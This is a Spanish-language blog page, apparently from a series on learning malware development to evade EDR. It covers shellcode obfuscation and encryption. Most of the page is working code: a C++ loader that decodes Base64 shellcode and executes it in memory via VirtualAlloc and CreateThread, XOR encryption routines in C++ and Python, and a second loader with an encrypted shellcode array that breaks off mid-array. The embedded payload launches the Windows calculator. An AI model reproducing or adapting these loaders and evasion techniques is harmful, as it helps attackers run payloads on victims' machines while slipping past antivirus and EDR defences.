<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/Obfuscacion_encriptacion.html" />
<meta property="og:url" content="http://localhost:4000/Obfuscacion_encriptacion.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/Obfuscacion_encriptacion.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de ralizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="obfuscación-y-encriptación-de-código">Obfuscación y encriptación de código</h1>

<p>Para evitar que el malware o shellcode a inyectar sea detectado por diferentes tipos de herramientas, en muchas ocasiones la mejor de las opciones será la de obfuscar o encriptar el código:</p>

<h2 id="obfuscacion-o-codificación">Obfuscacion o codificación</h2>
<p>Una de las tácticas más utilizadas para obfuscar un malware será la de codificar le contenido del payload que se desea inyectar. Ademas de una taćtica se tratará de una técnica utilizada por los desarrolladores para almacenar en el código fuente varaibles con su contenido en raw por lo que no siempore que se encuentren varaibles en el código fuente codificadas se tratará de contenido malicioso.
En la sección .data del binario definido como una varaiable global, se incluirá un payload en Base64 con el shellcode a inyectar.
Esto la añade un paso adicional a la inyección de código básica explicada en secciones anteriores y es lade Decodificar el contenido de la variable en Base64, antes de almacenarlo en la memoria reservada para la ejecución:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "Crypt32.lib")
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">calc_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">calc_payload</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">DecodeBase64</span><span class="p">(</span> <span class="k">const</span> <span class="n">BYTE</span> <span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">srcLen</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dstLen</span> <span class="p">)</span> <span class="p">{</span>

	<span class="n">DWORD</span> <span class="n">outLen</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">fRet</span><span class="p">;</span>

	<span class="n">outLen</span> <span class="o">=</span> <span class="n">dstLen</span><span class="p">;</span>
	<span class="n">fRet</span> <span class="o">=</span> <span class="n">CryptStringToBinary</span><span class="p">(</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span> <span class="n">src</span><span class="p">,</span> <span class="n">srcLen</span><span class="p">,</span> <span class="n">CRYPT_STRING_BASE64</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span> <span class="p">)</span><span class="n">dst</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outLen</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fRet</span><span class="p">)</span> <span class="n">outLen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// failed</span>
	
	<span class="k">return</span><span class="p">(</span> <span class="n">outLen</span> <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">outLenb64</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sotred payload in .data section %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"payload addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualAlloc] of new moemory region %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"exec_mem addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
	<span class="n">outLenb64</span> <span class="o">=</span> <span class="n">DecodeBase64</span><span class="p">((</span><span class="k">const</span> <span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Decoded payload output length %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">outLenb64</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Decoded payload memory position Base64 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outLenb64</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [RtlMoveMemory] copy data </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [CreateThread] Exec stored payload </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


</code></pre></div></div>
<p>Salida de la ejecución del proceso:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sotred payload in .data section payload addr         : 0x00007FF6F20CD000

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x0000017694DA0000

 Decoded payload output length 276

 Decoded payload memory position Base64 0x0000002AF52FF938

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload
</code></pre></div></div>

<h2 id="encriptación">Encriptación</h2>
<p>En el proceso de estudio de las medidas de evasión para realizar el bypass de un AV o un EDR, se realizarán dos tipos diferentes de encriptación simétrica.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">XOR</span>
<span class="n">AES</span>
</code></pre></div></div>
<p>Esto implica que para poder desencriptar el shellcode e inyectarlo en memoria en tiempo de ejecución será necesario que el código fuente contenga la clave de cifrado :</p>

<h3 id="encriptación-xor-de-shellcode">Encriptación XOR de shellcode</h3>

<p>El código funete asociado al cifrado con XOR, realizara un cifrado simétrico byte a byte realizando la siguiente operación:</p>

<table>
  <thead>
    <tr>
      <th>A</th>
      <th>B</th>
      <th>A XOR B</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td>0</td>
      <td>0</td>
    </tr>
    <tr>
      <td>0</td>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>1</td>
      <td>0</td>
      <td>1</td>
    </tr>
    <tr>
      <td>1</td>
      <td>1</td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<p>La función criptográfica codificada será la siguiente:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>

    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                                  <span class="c1">// se inicializa el bucle para empezar por byte 0</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    <span class="c1">// se recorre uno a uno todos los bytes del buffer</span>
        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>         <span class="c1">// se aplica la operación de cifrado para cada byte ^</span>
        <span class="n">j</span><span class="o">++</span><span class="p">;</span>                                <span class="c1">// se aumenta el contador de la clave de cifrado key</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>        <span class="c1">// Se valida si es el último byte de la clave para inicializar el contador j</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Código fuente en python2 para encriptar con algoritmo XOR:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="sh">"</span><span class="s">y__modaba!!!</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
	
	<span class="n">key</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
	<span class="n">l</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
	<span class="n">output_str</span> <span class="o">=</span> <span class="sh">""</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
		<span class="n">current</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
		<span class="n">current_key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span>
		<span class="n">output_str</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">current</span><span class="p">)</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">current_key</span><span class="p">))</span>
	
	<span class="k">return</span> <span class="n">output_str</span>

<span class="k">def</span> <span class="nf">printCiphertext</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">):</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">{ 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>



<span class="k">try</span><span class="p">:</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">File argument needed! %s &lt;raw payload file&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>


<span class="n">ciphertext</span> <span class="o">=</span> <span class="nf">xor</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">KEY</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">{ 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>

</code></pre></div></div>

<p>Codigo fuente con el shellcode de la calculadora de windows:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
	
	<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">calc_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span 